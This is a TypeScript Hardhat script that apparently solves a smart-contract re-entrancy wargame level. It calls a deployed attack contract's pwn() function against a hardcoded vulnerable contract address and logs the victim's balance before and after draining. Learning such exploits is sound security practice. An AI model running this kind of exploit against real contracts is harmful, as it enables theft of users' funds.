import { deployments, ethers } from "hardhat";
import { Deployment } from "hardhat-deploy/types";
import { AttackReentrance, Reentrance } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async (): Promise<void> => {
  const reentranceAddress = "0x6af1bf3271c7Efc977A77e69Fca2a55A180b8793";
  const reentrance: Reentrance = await ethers.getContractAt("Reentrance", reentranceAddress);
  const attackReentranceDeployment: Deployment = await deployments.get("AttackReentrance");
  const attackReentrance: AttackReentrance = await ethers.getContractAt("AttackReentrance", attackReentranceDeployment.address);

  console.log(`💰 Reentrance balance: ${await ethers.provider.getBalance(reentrance.address)}`);
  await attackReentrance.pwn({
    gasLimit: 500000
  });
  console.log(`💼 Attack balance: ${await reentrance.balanceOf(attackReentrance.address)}`)
  console.log(`💰 Reentrance balance Post-Attack: ${await ethers.provider.getBalance(reentrance.address)}`);
};

main().catch(error => {
  console.error('🚫', error);
});
